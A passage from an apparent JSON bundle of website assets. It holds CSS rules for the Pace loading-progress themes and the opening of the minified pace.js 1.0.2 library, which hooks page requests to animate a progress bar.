.pace-progress-inner:after{-webkit-transform:rotate(362deg);-ms-transform:rotate(362deg);transform:rotate(362deg);display:block}.pace-progress[data-progress=\"64\"] .pace-progress-inner:after{-webkit-transform:rotate(365deg);-ms-transform:rotate(365deg);transform:rotate(365deg);display:block}.pace-progress[data-progress=\"65\"] .pace-progress-inner:after{-webkit-transform:rotate(369deg);-ms-transform:rotate(369deg);transform:rotate(369deg);display:block}.pace-progress[data-progress=\"66\"] .pace-progress-inner:after{-webkit-transform:rotate(373deg);-ms-transform:rotate(373deg);transform:rotate(373deg);display:block}.pace-progress[data-progress=\"67\"] .pace-progress-inner:after{-webkit-transform:rotate(376deg);-ms-transform:rotate(376deg);transform:rotate(376deg);display:block}.pace-progress[data-progress=\"68\"] .pace-progress-inner:after{-webkit-transform:rotate(380deg);-ms-transform:rotate(380deg);transform:rotate(380deg);display:block}.pace-progress[data-progress=\"69\"] .pace-progress-inner:after{-webkit-transform:rotate(383deg);-ms-transform:rotate(383deg);transform:rotate(383deg);display:block}.pace-progress[data-progress=\"70\"] .pace-progress-inner:after{-webkit-transform:rotate(387deg);-ms-transform:rotate(387deg);transform:rotate(387deg);display:block}.pace-progress[data-progress=\"71\"] .pace-progress-inner:after{-webkit-transform:rotate(391deg);-ms-transform:rotate(391deg);transform:rotate(391deg);display:block}.pace-progress[data-progress=\"72\"] .pace-progress-inner:after{-webkit-transform:rotate(394deg);-ms-transform:rotate(394deg);transform:rotate(394deg);display:block}.pace-progress[data-progress=\"73\"] .pace-progress-inner:after{-webkit-transform:rotate(398deg);-ms-transform:rotate(398deg);transform:rotate(398deg);display:block}.pace-progress[data-progress=\"74\"] .pace-progress-inner:after{-webkit-transform:rotate(401deg);-ms-transform:rotate(401deg);transform:rotate(401deg);display:block}.pace-progress[data-progress=\"75\"] .pace-progress-inner:after{-webkit-transform:rotate(405deg);-ms-transform:rotate(405deg);transform:rotate(405deg);display:block}.pace-progress[data-progress=\"76\"] .pace-progress-inner:after{-webkit-transform:rotate(409deg);-ms-transform:rotate(409deg);transform:rotate(409deg);display:block}.pace-progress[data-progress=\"77\"] .pace-progress-inner:after{-webkit-transform:rotate(412deg);-ms-transform:rotate(412deg);transform:rotate(412deg);display:block}.pace-progress[data-progress=\"78\"] .pace-progress-inner:after{-webkit-transform:rotate(416deg);-ms-transform:rotate(416deg);transform:rotate(416deg);display:block}.pace-progress[data-progress=\"79\"] .pace-progress-inner:after{-webkit-transform:rotate(419deg);-ms-transform:rotate(419deg);transform:rotate(419deg);display:block}.pace-progress[data-progress=\"80\"] .pace-progress-inner:after{-webkit-transform:rotate(423deg);-ms-transform:rotate(423deg);transform:rotate(423deg);display:block}.pace-progress[data-progress=\"81\"] .pace-progress-inner:after{-webkit-transform:rotate(427deg);-ms-transform:rotate(427deg);transform:rotate(427deg);display:block}.pace-progress[data-progress=\"82\"] .pace-progress-inner:after{-webkit-transform:rotate(430deg);-ms-transform:rotate(430deg);transform:rotate(430deg);display:block}.pace-progress[data-progress=\"83\"] .pace-progress-inner:after{-webkit-transform:rotate(434deg);-ms-transform:rotate(434deg);transform:rotate(434deg);display:block}.pace-progress[data-progress=\"84\"] .pace-progress-inner:after{-webkit-transform:rotate(437deg);-ms-transform:rotate(437deg);transform:rotate(437deg);display:block}.pace-progress[data-progress=\"85\"] .pace-progress-inner:after{-webkit-transform:rotate(441deg);-ms-transform:rotate(441deg);transform:rotate(441deg);display:block}.pace-progress[data-progress=\"86\"] .pace-progress-inner:after{-webkit-transform:rotate(445deg);-ms-transform:rotate(445deg);transform:rotate(445deg);display:block}.pace-progress[data-progress=\"87\"] .pace-progress-inner:after{-webkit-transform:rotate(448deg);-ms-transform:rotate(448deg);transform:rotate(448deg);display:block}.pace-progress[data-progress=\"88\"] .pace-progress-inner:after{-webkit-transform:rotate(452deg);-ms-transform:rotate(452deg);transform:rotate(452deg);display:block}.pace-progress[data-progress=\"89\"] .pace-progress-inner:after{-webkit-transform:rotate(455deg);-ms-transform:rotate(455deg);transform:rotate(455deg);display:block}.pace-progress[data-progress=\"90\"] .pace-progress-inner:after{-webkit-transform:rotate(459deg);-ms-transform:rotate(459deg);transform:rotate(459deg);display:block}.pace-progress[data-progress=\"91\"] .pace-progress-inner:after{-webkit-transform:rotate(463deg);-ms-transform:rotate(463deg);transform:rotate(463deg);display:block}.pace-progress[data-progress=\"92\"] .pace-progress-inner:after{-webkit-transform:rotate(466deg);-ms-transform:rotate(466deg);transform:rotate(466deg);display:block}.pace-progress[data-progress=\"93\"] .pace-progress-inner:after{-webkit-transform:rotate(470deg);-ms-transform:rotate(470deg);transform:rotate(470deg);display:block}.pace-progress[data-progress=\"94\"] .pace-progress-inner:after{-webkit-transform:rotate(473deg);-ms-transform:rotate(473deg);transform:rotate(473deg);display:block}.pace-progress[data-progress=\"95\"] .pace-progress-inner:after{-webkit-transform:rotate(477deg);-ms-transform:rotate(477deg);transform:rotate(477deg);display:block}.pace-progress[data-progress=\"96\"] .pace-progress-inner:after{-webkit-transform:rotate(481deg);-ms-transform:rotate(481deg);transform:rotate(481deg);display:block}.pace-progress[data-progress=\"97\"] .pace-progress-inner:after{-webkit-transform:rotate(484deg);-ms-transform:rotate(484deg);transform:rotate(484deg);display:block}.pace-progress[data-progress=\"98\"] .pace-progress-inner:after{-webkit-transform:rotate(488deg);-ms-transform:rotate(488deg);transform:rotate(488deg);display:block}.pace-progress[data-progress=\"99\"] .pace-progress-inner:after{-webkit-transform:rotate(491deg);-ms-transform:rotate(491deg);transform:rotate(491deg);display:block}.pace-progress[data-progress=\"100\"] .pace-progress-inner:after{-webkit-transform:rotate(495deg);-ms-transform:rotate(495deg);transform:rotate(495deg);display:block}.pace-progress[data-progress=\"00\"] .pace-progress-inner{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0)}.pace-progress[data-progress=\"01\"] .pace-progress-inner{-webkit-transform:rotate(4deg);-ms-transform:rotate(4deg);transform:rotate(4deg)}.pace-progress[data-progress=\"02\"] .pace-progress-inner{-webkit-transform:rotate(7deg);-ms-transform:rotate(7deg);transform:rotate(7deg)}.pace-progress[data-progress=\"03\"] .pace-progress-inner{-webkit-transform:rotate(11deg);-ms-transform:rotate(11deg);transform:rotate(11deg)}.pace-progress[data-progress=\"04\"] .pace-progress-inner{-webkit-transform:rotate(14deg);-ms-transform:rotate(14deg);transform:rotate(14deg)}.pace-progress[data-progress=\"05\"] .pace-progress-inner{-webkit-transform:rotate(18deg);-ms-transform:rotate(18deg);transform:rotate(18deg)}.pace-progress[data-progress=\"06\"] .pace-progress-inner{-webkit-transform:rotate(22deg);-ms-transform:rotate(22deg);transform:rotate(22deg)}.pace-progress[data-progress=\"07\"] .pace-progress-inner{-webkit-transform:rotate(25deg);-ms-transform:rotate(25deg);transform:rotate(25deg)}.pace-progress[data-progress=\"08\"] .pace-progress-inner{-webkit-transform:rotate(29deg);-ms-transform:rotate(29deg);transform:rotate(29deg)}.pace-progress[data-progress=\"09\"] .pace-progress-inner{-webkit-transform:rotate(32deg);-ms-transform:rotate(32deg);transform:rotate(32deg)}.pace-progress[data-progress=\"10\"] .pace-progress-inner{-webkit-transform:rotate(36deg);-ms-transform:rotate(36deg);transform:rotate(36deg)}.pace-progress[data-progress=\"11\"] .pace-progress-inner{-webkit-transform:rotate(40deg);-ms-transform:rotate(40deg);transform:rotate(40deg)}.pace-progress[data-progress=\"12\"] .pace-progress-inner{-webkit-transform:rotate(43deg);-ms-transform:rotate(43deg);transform:rotate(43deg)}.pace-progress[data-progress=\"13\"] .pace-progress-inner{-webkit-transform:rotate(47deg);-ms-transform:rotate(47deg);transform:rotate(47deg)}.pace-progress[data-progress=\"14\"] .pace-progress-inner{-webkit-transform:rotate(50deg);-ms-transform:rotate(50deg);transform:rotate(50deg)}.pace-progress[data-progress=\"15\"] .pace-progress-inner{-webkit-transform:rotate(54deg);-ms-transform:rotate(54deg);transform:rotate(54deg)}.pace-progress[data-progress=\"16\"] .pace-progress-inner{-webkit-transform:rotate(58deg);-ms-transform:rotate(58deg);transform:rotate(58deg)}.pace-progress[data-progress=\"17\"] .pace-progress-inner{-webkit-transform:rotate(61deg);-ms-transform:rotate(61deg);transform:rotate(61deg)}.pace-progress[data-progress=\"18\"] .pace-progress-inner{-webkit-transform:rotate(65deg);-ms-transform:rotate(65deg);transform:rotate(65deg)}.pace-progress[data-progress=\"19\"] .pace-progress-inner{-webkit-transform:rotate(68deg);-ms-transform:rotate(68deg);transform:rotate(68deg)}.pace-progress[data-progress=\"20\"] .pace-progress-inner{-webkit-transform:rotate(72deg);-ms-transform:rotate(72deg);transform:rotate(72deg)}.pace-progress[data-progress=\"21\"] .pace-progress-inner{-webkit-transform:rotate(76deg);-ms-transform:rotate(76deg);transform:rotate(76deg)}.pace-progress[data-progress=\"22\"] .pace-progress-inner{-webkit-transform:rotate(79deg);-ms-transform:rotate(79deg);transform:rotate(79deg)}.pace-progress[data-progress=\"23\"] .pace-progress-inner{-webkit-transform:rotate(83deg);-ms-transform:rotate(83deg);transform:rotate(83deg)}.pace-progress[data-progress=\"24\"] .pace-progress-inner{-webkit-transform:rotate(86deg);-ms-transform:rotate(86deg);transform:rotate(86deg)}.pace-progress[data-progress=\"25\"] .pace-progress-inner{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.pace-progress[data-progress=\"26\"] .pace-progress-inner{-webkit-transform:rotate(94deg);-ms-transform:rotate(94deg);transform:rotate(94deg)}.pace-progress[data-progress=\"27\"] .pace-progress-inner{-webkit-transform:rotate(97deg);-ms-transform:rotate(97deg);transform:rotate(97deg)}.pace-progress[data-progress=\"28\"] .pace-progress-inner{-webkit-transform:rotate(101deg);-ms-transform:rotate(101deg);transform:rotate(101deg)}.pace-progress[data-progress=\"29\"] .pace-progress-inner{-webkit-transform:rotate(104deg);-ms-transform:rotate(104deg);transform:rotate(104deg)}.pace-progress[data-progress=\"30\"] .pace-progress-inner{-webkit-transform:rotate(108deg);-ms-transform:rotate(108deg);transform:rotate(108deg)}.pace-progress[data-progress=\"31\"] .pace-progress-inner{-webkit-transform:rotate(112deg);-ms-transform:rotate(112deg);transform:rotate(112deg)}.pace-progress[data-progress=\"32\"] .pace-progress-inner{-webkit-transform:rotate(115deg);-ms-transform:rotate(115deg);transform:rotate(115deg)}.pace-progress[data-progress=\"33\"] .pace-progress-inner{-webkit-transform:rotate(119deg);-ms-transform:rotate(119deg);transform:rotate(119deg)}.pace-progress[data-progress=\"34\"] .pace-progress-inner{-webkit-transform:rotate(122deg);-ms-transform:rotate(122deg);transform:rotate(122deg)}.pace-progress[data-progress=\"35\"] .pace-progress-inner{-webkit-transform:rotate(126deg);-ms-transform:rotate(126deg);transform:rotate(126deg)}.pace-progress[data-progress=\"36\"] .pace-progress-inner{-webkit-transform:rotate(130deg);-ms-transform:rotate(130deg);transform:rotate(130deg)}.pace-progress[data-progress=\"37\"] .pace-progress-inner{-webkit-transform:rotate(133deg);-ms-transform:rotate(133deg);transform:rotate(133deg)}.pace-progress[data-progress=\"38\"] .pace-progress-inner{-webkit-transform:rotate(137deg);-ms-transform:rotate(137deg);transform:rotate(137deg)}.pace-progress[data-progress=\"39\"] .pace-progress-inner{-webkit-transform:rotate(140deg);-ms-transform:rotate(140deg);transform:rotate(140deg)}.pace-progress[data-progress=\"40\"] .pace-progress-inner{-webkit-transform:rotate(144deg);-ms-transform:rotate(144deg);transform:rotate(144deg)}.pace-progress[data-progress=\"41\"] .pace-progress-inner{-webkit-transform:rotate(148deg);-ms-transform:rotate(148deg);transform:rotate(148deg)}.pace-progress[data-progress=\"42\"] .pace-progress-inner{-webkit-transform:rotate(151deg);-ms-transform:rotate(151deg);transform:rotate(151deg)}.pace-progress[data-progress=\"43\"] .pace-progress-inner{-webkit-transform:rotate(155deg);-ms-transform:rotate(155deg);transform:rotate(155deg)}.pace-progress[data-progress=\"44\"] .pace-progress-inner{-webkit-transform:rotate(158deg);-ms-transform:rotate(158deg);transform:rotate(158deg)}.pace-progress[data-progress=\"45\"] .pace-progress-inner{-webkit-transform:rotate(162deg);-ms-transform:rotate(162deg);transform:rotate(162deg)}.pace-progress[data-progress=\"46\"] .pace-progress-inner{-webkit-transform:rotate(166deg);-ms-transform:rotate(166deg);transform:rotate(166deg)}.pace-progress[data-progress=\"47\"] .pace-progress-inner{-webkit-transform:rotate(169deg);-ms-transform:rotate(169deg);transform:rotate(169deg)}.pace-progress[data-progress=\"48\"] .pace-progress-inner{-webkit-transform:rotate(173deg);-ms-transform:rotate(173deg);transform:rotate(173deg)}.pace-progress[data-progress=\"49\"] .pace-progress-inner{-webkit-transform:rotate(176deg);-ms-transform:rotate(176deg);transform:rotate(176deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.pace-progress[data-progress=\"51\"] .pace-progress-inner{-webkit-transform:rotate(184deg);-ms-transform:rotate(184deg);transform:rotate(184deg);overflow:visible}.pace-progress[data-progress=\"52\"] .pace-progress-inner{-webkit-transform:rotate(187deg);-ms-transform:rotate(187deg);transform:rotate(187deg);overflow:visible}.pace-progress[data-progress=\"53\"] .pace-progress-inner{-webkit-transform:rotate(191deg);-ms-transform:rotate(191deg);transform:rotate(191deg);overflow:visible}.pace-progress[data-progress=\"54\"] .pace-progress-inner{-webkit-transform:rotate(194deg);-ms-transform:rotate(194deg);transform:rotate(194deg);overflow:visible}.pace-progress[data-progress=\"55\"] .pace-progress-inner{-webkit-transform:rotate(198deg);-ms-transform:rotate(198deg);transform:rotate(198deg);overflow:visible}.pace-progress[data-progress=\"56\"] .pace-progress-inner{-webkit-transform:rotate(202deg);-ms-transform:rotate(202deg);transform:rotate(202deg);overflow:visible}.pace-progress[data-progress=\"57\"] .pace-progress-inner{-webkit-transform:rotate(205deg);-ms-transform:rotate(205deg);transform:rotate(205deg);overflow:visible}.pace-progress[data-progress=\"58\"] .pace-progress-inner{-webkit-transform:rotate(209deg);-ms-transform:rotate(209deg);transform:rotate(209deg);overflow:visible}.pace-progress[data-progress=\"59\"] .pace-progress-inner{-webkit-transform:rotate(212deg);-ms-transform:rotate(212deg);transform:rotate(212deg);overflow:visible}.pace-progress[data-progress=\"60\"] .pace-progress-inner{-webkit-transform:rotate(216deg);-ms-transform:rotate(216deg);transform:rotate(216deg);overflow:visible}.pace-progress[data-progress=\"61\"] .pace-progress-inner{-webkit-transform:rotate(220deg);-ms-transform:rotate(220deg);transform:rotate(220deg);overflow:visible}.pace-progress[data-progress=\"62\"] .pace-progress-inner{-webkit-transform:rotate(223deg);-ms-transform:rotate(223deg);transform:rotate(223deg);overflow:visible}.pace-progress[data-progress=\"63\"] .pace-progress-inner{-webkit-transform:rotate(227deg);-ms-transform:rotate(227deg);transform:rotate(227deg);overflow:visible}.pace-progress[data-progress=\"64\"] .pace-progress-inner{-webkit-transform:rotate(230deg);-ms-transform:rotate(230deg);transform:rotate(230deg);overflow:visible}.pace-progress[data-progress=\"65\"] .pace-progress-inner{-webkit-transform:rotate(234deg);-ms-transform:rotate(234deg);transform:rotate(234deg);overflow:visible}.pace-progress[data-progress=\"66\"] .pace-progress-inner{-webkit-transform:rotate(238deg);-ms-transform:rotate(238deg);transform:rotate(238deg);overflow:visible}.pace-progress[data-progress=\"67\"] .pace-progress-inner{-webkit-transform:rotate(241deg);-ms-transform:rotate(241deg);transform:rotate(241deg);overflow:visible}.pace-progress[data-progress=\"68\"] .pace-progress-inner{-webkit-transform:rotate(245deg);-ms-transform:rotate(245deg);transform:rotate(245deg);overflow:visible}.pace-progress[data-progress=\"69\"] .pace-progress-inner{-webkit-transform:rotate(248deg);-ms-transform:rotate(248deg);transform:rotate(248deg);overflow:visible}.pace-progress[data-progress=\"70\"] .pace-progress-inner{-webkit-transform:rotate(252deg);-ms-transform:rotate(252deg);transform:rotate(252deg);overflow:visible}.pace-progress[data-progress=\"71\"] .pace-progress-inner{-webkit-transform:rotate(256deg);-ms-transform:rotate(256deg);transform:rotate(256deg);overflow:visible}.pace-progress[data-progress=\"72\"] .pace-progress-inner{-webkit-transform:rotate(259deg);-ms-transform:rotate(259deg);transform:rotate(259deg);overflow:visible}.pace-progress[data-progress=\"73\"] .pace-progress-inner{-webkit-transform:rotate(263deg);-ms-transform:rotate(263deg);transform:rotate(263deg);overflow:visible}.pace-progress[data-progress=\"74\"] .pace-progress-inner{-webkit-transform:rotate(266deg);-ms-transform:rotate(266deg);transform:rotate(266deg);overflow:visible}.pace-progress[data-progress=\"75\"] .pace-progress-inner{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg);overflow:visible}.pace-progress[data-progress=\"76\"] .pace-progress-inner{-webkit-transform:rotate(274deg);-ms-transform:rotate(274deg);transform:rotate(274deg);overflow:visible}.pace-progress[data-progress=\"77\"] .pace-progress-inner{-webkit-transform:rotate(277deg);-ms-transform:rotate(277deg);transform:rotate(277deg);overflow:visible}.pace-progress[data-progress=\"78\"] .pace-progress-inner{-webkit-transform:rotate(281deg);-ms-transform:rotate(281deg);transform:rotate(281deg);overflow:visible}.pace-progress[data-progress=\"79\"] .pace-progress-inner{-webkit-transform:rotate(284deg);-ms-transform:rotate(284deg);transform:rotate(284deg);overflow:visible}.pace-progress[data-progress=\"80\"] .pace-progress-inner{-webkit-transform:rotate(288deg);-ms-transform:rotate(288deg);transform:rotate(288deg);overflow:visible}.pace-progress[data-progress=\"81\"] .pace-progress-inner{-webkit-transform:rotate(292deg);-ms-transform:rotate(292deg);transform:rotate(292deg);overflow:visible}.pace-progress[data-progress=\"82\"] .pace-progress-inner{-webkit-transform:rotate(295deg);-ms-transform:rotate(295deg);transform:rotate(295deg);overflow:visible}.pace-progress[data-progress=\"83\"] .pace-progress-inner{-webkit-transform:rotate(299deg);-ms-transform:rotate(299deg);transform:rotate(299deg);overflow:visible}.pace-progress[data-progress=\"84\"] .pace-progress-inner{-webkit-transform:rotate(302deg);-ms-transform:rotate(302deg);transform:rotate(302deg);overflow:visible}.pace-progress[data-progress=\"85\"] .pace-progress-inner{-webkit-transform:rotate(306deg);-ms-transform:rotate(306deg);transform:rotate(306deg);overflow:visible}.pace-progress[data-progress=\"86\"] .pace-progress-inner{-webkit-transform:rotate(310deg);-ms-transform:rotate(310deg);transform:rotate(310deg);overflow:visible}.pace-progress[data-progress=\"87\"] .pace-progress-inner{-webkit-transform:rotate(313deg);-ms-transform:rotate(313deg);transform:rotate(313deg);overflow:visible}.pace-progress[data-progress=\"88\"] .pace-progress-inner{-webkit-transform:rotate(317deg);-ms-transform:rotate(317deg);transform:rotate(317deg);overflow:visible}.pace-progress[data-progress=\"89\"] .pace-progress-inner{-webkit-transform:rotate(320deg);-ms-transform:rotate(320deg);transform:rotate(320deg);overflow:visible}.pace-progress[data-progress=\"90\"] .pace-progress-inner{-webkit-transform:rotate(324deg);-ms-transform:rotate(324deg);transform:rotate(324deg);overflow:visible}.pace-progress[data-progress=\"91\"] .pace-progress-inner{-webkit-transform:rotate(328deg);-ms-transform:rotate(328deg);transform:rotate(328deg);overflow:visible}.pace-progress[data-progress=\"92\"] .pace-progress-inner{-webkit-transform:rotate(331deg);-ms-transform:rotate(331deg);transform:rotate(331deg);overflow:visible}.pace-progress[data-progress=\"93\"] .pace-progress-inner{-webkit-transform:rotate(335deg);-ms-transform:rotate(335deg);transform:rotate(335deg);overflow:visible}.pace-progress[data-progress=\"94\"] .pace-progress-inner{-webkit-transform:rotate(338deg);-ms-transform:rotate(338deg);transform:rotate(338deg);overflow:visible}.pace-progress[data-progress=\"95\"] .pace-progress-inner{-webkit-transform:rotate(342deg);-ms-transform:rotate(342deg);transform:rotate(342deg);overflow:visible}.pace-progress[data-progress=\"96\"] .pace-progress-inner{-webkit-transform:rotate(346deg);-ms-transform:rotate(346deg);transform:rotate(346deg);overflow:visible}.pace-progress[data-progress=\"97\"] .pace-progress-inner{-webkit-transform:rotate(349deg);-ms-transform:rotate(349deg);transform:rotate(349deg);overflow:visible}.pace-progress[data-progress=\"98\"] .pace-progress-inner{-webkit-transform:rotate(353deg);-ms-transform:rotate(353deg);transform:rotate(353deg);overflow:visible}.pace-progress[data-progress=\"99\"] .pace-progress-inner{-webkit-transform:rotate(356deg);-ms-transform:rotate(356deg);transform:rotate(356deg);overflow:visible}.pace-progress[data-progress=\"100\"] .pace-progress-inner{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);overflow:visible}\n"},{"url":"/lib/pace/pace-theme-minimal.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}"},{"url":"/lib/pace/pace.min.js","content":"/*! pace 1.0.2 */\n(function(){var a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X=[].slice,Y={}.hasOwnProperty,Z=function(a,b){function c(){this.constructor=a}for(var d in b)Y.call(b,d)&&(a[d]=b[d]);return c.prototype=b.prototype,a.prototype=new c,a.__super__=b.prototype,a},$=[].indexOf||function(a){for(var b=0,c=this.length;c>b;b++)if(b in this&&this[b]===a)return b;return-1};for(u={catchupTime:100,initialRate:.03,minTime:250,ghostTime:100,maxProgressPerFrame:20,easeFactor:1.25,startOnPageLoad:!0,restartOnPushState:!0,restartOnRequestAfter:500,target:\"body\",elements:{checkInterval:100,selectors:[\"body\"]},eventLag:{minSamples:10,sampleCount:3,lagThreshold:3},ajax:{trackMethods:[\"GET\"],trackWebSockets:!0,ignoreURLs:[]}},C=function(){var a;return null!=(a=\"undefined\"!=typeof performance&&null!==performance&&\"function\"==typeof performance.now?performance.now():void 0)?a:+new Date},E=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame,t=window.cancelAnimationFrame||window.mozCancelAnimationFrame,null==E&&(E=function(a){return setTimeout(a,50)},t=function(a){return clearTimeout(a)}),G=function(a){var b,c;return b=C(),(c=function(){var d;return d=C()-b,d>=33?(b=C(),a(d,function(){return E(c)})):setTimeout(c,33-d)})()},F=function(){var a,b,c;return c=arguments[0],b=arguments[1],a=3<=arguments.length?X.call(arguments,2):[],\"function\"==typeof c[b]?c[b].apply(c,a):c[b]},v=function(){var a,b,c,d,e,f,g;for(b=arguments[0],d=2<=arguments.length?X.call(arguments,1):[],f=0,g=d.length;g>f;f++)if(c=d[f])for(a in c)Y.call(c,a)&&(e=c[a],null!=b[a]&&\"object\"==typeof b[a]&&null!=e&&\"object\"==typeof e?v(b[a],e):b[a]=e);return b},q=function(a){var b,c,d,e,f;for(c=b=0,e=0,f=a.length;f>e;e++)d=a[e],c+=Math.abs(d),b++;return c/b},x=function(a,b){var c,d,e;if(null==a&&(a=\"options\"),null==b&&(b=!0),e=document.querySelector(\"[data-pace-\"+a+\"]\")){if(c=e.getAttribute(\"data-pace-\"+a),!b)return c;try{return JSON.parse(c)}catch(f){return d=f,\"undefined\"!=typeof console&&null!==console?console.error(\"Error parsing inline pace options\",d):void 0}}},g=function(){function a(){}return a.prototype.on=function(a,b,c,d){var e;return null==d&&(d=!1),null==this.bindings&&(this.bindings={}),null==(e=this.bindings)[a]&&(e[a]=[]),this.bindings[a].push({handler:b,ctx:c,once:d})},a.prototype.once=function(a,b,c){return this.on(a,b,c,!0)},a.prototype.off=function(a,b){var c,d,e;if(null!=(null!=(d=this.bindings)?d[a]:void 0)){if(null==b)return delete this.bindings[a];for(c=0,e=[];c<this.bindings[a].length;)e.push(this.bindings[a][c].handler===b?this.bindings[a].splice(c,1):c++);return e}},a.prototype.trigger=function(){var a,b,c,d,e,f,g,h,i;if(c=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],null!=(g=this.bindings)?g[c]:void 0){for(e=0,i=[];e<this.bindings[c].length;)h=this.bindings[c][e],d=h.handler,b=h.ctx,f=h.once,d.apply(null!=b?b:this,a),i.push(f?this.bindings[c].splice(e,1):e++);return i}},a}(),j=window.Pace||{},window.Pace=j,v(j,g.prototype),D=j.options=v({},u,window.paceOptions,x()),U=[\"ajax\",\"document\",\"eventLag\",\"elements\"],Q=0,S=U.length;S>Q;Q++)K=U[Q],D[K]===!0&&(D[K]=u[K]);i=function(a){function b(){return V=b.__super__.constructor.apply(this,arguments)}return Z(b,a),b}(Error),b=function(){function a(){this.progress=0}return a.prototype.getElement=function(){var a;if(null==this.el){if(a=document.querySelector(D.target),!a)throw new i;this.el=document.createElement(\"div\"),this.el.className=\"pace pace-active\",document.body.className=document.body.className.replace(/pace-done/g,\"\"),document.body.className+=\" pace-running\",this.el.innerHTML='<div class=\"pace-progress\">\\n  <div class=\"pace-progress-inner\"></div>\\n</div>\\n<div class=\"pace-activity\"></div>',null!=a.firstChild?a.insertBefore(this.el,a.firstChild):a.appendChild(this.el)}return this.el},a.prototype.finish=function(){var a;return a=this.getElement(),a.className=a.className.replace(\"pace-active\",\"\"),a.className+=\" pace-inactive\",document.body.className=document.body.className.replace(\"pace-running\",\"\"),document.body.className+=\" pace-done\"},a.prototype.update=function(a){return this.progress=a,this.render()},a.prototype.destroy=function(){try{this.getElement().parentNode.removeChild(this.getElement())}catch(a){i=a}return this.el=void 0},a.prototype.render=function(){var a,b,c,d,e,f,g;if(null==document.querySelector(D.target))return!1;for(a=this.getElement(),d=\"translate3d(\"+this.progress+\"%, 0, 0)\",g=[\"webkitTransform\",\"msTransform\",\"transform\"],e=0,f=g.length;f>e;e++)b=g[e],a.children[0].style[b]=d;return(!this.lastRenderedProgress||this.lastRenderedProgress|0!==this.progress|0)&&(a.children[0].setAttribute(\"data-progress-text\",\"\"+(0|this.progress)+\"%\"),this.progress>=100?c=\"99\":(c=this.progress<10?\"0\":\"\",c+=0|this.progress),a.children[0].setAttribute(\"data-progress\",\"\"+c)),this.lastRenderedProgress=this.progress},a.prototype.done=function(){return this.progress>=100},a}(),h=function(){function a(){this.bindings={}}return a.prototype.trigger=function(a,b){var c,d,e,f,g;if(null!=this.bindings[a]){for(f=this.bindings[a],g=[],d=0,e=f.length;e>d;d++)c=f[d],g.push(c.call(this,b));return g}},a.prototype.on=function(a,b){var c;return null==(c=this.bindings)[a]&&(c[a]=[]),this.bindings[a].push(b)},a}(),P=window.XMLHttpRequest,O=window.XDomainRequest,N=window.WebSocket,w=function(a,b){var c,d,e;e=[];for(d in b.prototype)try{e.push(null==a[d]&&\"function\"!=typeof b[d]?\"function\"==typeof Object.defineProperty?Object.defineProperty(a,d,{get:function(){return b.prototype[d]},configurable:!0,enumerable:!0}):a[d]=b.prototype[d]:void 0)}catch(f){c=f}return e},A=[],j.ignore=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift(\"ignore\"),c=b.apply(null,a),A.shift(),c},j.track=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift(\"track\"),c=b.apply(null,a),A.shift(),c},J=function(a){var b;if(null==a&&(a=\"GET\"),\"track\"===A[0])return\"force\";if(!A.length&&D.ajax){if(\"socket\"===a&&D.ajax.trackWebSockets)return!0;if(b=a.toUpperCase(),$.call(D.ajax.trackMethods,b)>=0)return!0}return!1},k=function(a){function b(){var a,c=this;b.__super__.constructor.apply(this,arguments),a=function(a){var b;return b=a.open,a.open=function(d,e){return J(d)&&c.trigger(\"request\",{type:d,url:e,request:a}),b.apply(a,arguments)}},window.XMLHttpRequest=function(b){var c;return c=new P(b),a(c),c};try{w(window.XMLHttpRequest,P)}catch(d){}if(null!=O){window.XDomainRequest=function(){var b;return b=new O,a(b),b};try{w(window.XDomainRequest,O)}catch(d){}}if(null!=N&&D.ajax.trackWebSockets){window.WebSocket=function(a,b){var d;return d=null!=b?new N(a,b):new N(a),J(\"socket\")&&c.trigger(\"request\",{type:\"socket\",url:a,protocols:b,request:d}),d};try{w(window.WebSocket,N)}catch(d){}}}return Z(b,a),b}(h),R=null,y=function(){return null==R&&(R=new k),R},I=function(a){var b,c,d,e;for(e=D.ajax.ignoreURLs,c=0,d=e.length;d>c;c++)if(b=e[c],\"string\"==typeof b){if(-1!==a.indexOf(b))return!0}else if(b.test(a))return!0;return!1},y().on(\"request\",function(b){var c,d,e,f,g;return f=b.type,e=b.request,g=b.url,I(g)?void 0:j.running||D.restartOnRequestAfter===!1&&\"force\"!==J(f)?void 0:(d=arguments,c=D.restartOnRequestAfter||0,\"boolean\"==typeof c&&(c=0),setTimeout(function(){var b,c,g,h,i,k;if(b=\"socket\"===f?e.readyState<2:0<(h=e.readyState)&&4>h){for(j.restart(),i=j.sources,k=[],c=0,g=i.length;g>c;c++){if(K=i[c],K instanceof a){K.watch.apply(K,d);break}k.push(void 0)}return k}},c))}),a=function(){function a(){var a=this;this.elements=[],y().on(\"request\",function(){return a.watch.apply(a,arguments)})}return a.prototype.watch=function(a){var b,c,d,e;return d=a.type,b=a.request,e=a.url,I(e)?void 0:(c=\"socket\"===d?new n(b):new o(b),this.elements.push(c))},a}(),o=function(){function a(a){var b,c,d,e,f,g,h=this;if(this.progress=0,null!=window.ProgressEvent)for(c=null,a.addEventListener(\"progress\",function(a){return h.progress=a.lengthComputable?100*a.loaded/a.total:h.progress+(100-h.progress)/2},!1),g=[\"load\",\"abort\",\"timeout\",\"error\"],d=0,e=g.length;e>d;d++)b=g[d],a.addEventListener(b,function(){return h.progress=100},!1);else f=a.onreadystatechange,a.onreadystatechange=function(){var b;return 0===(b=a.readyState)||4===b?h.progress=100:3===a.readyState&&(h.progress=50),\"function\"==typeof 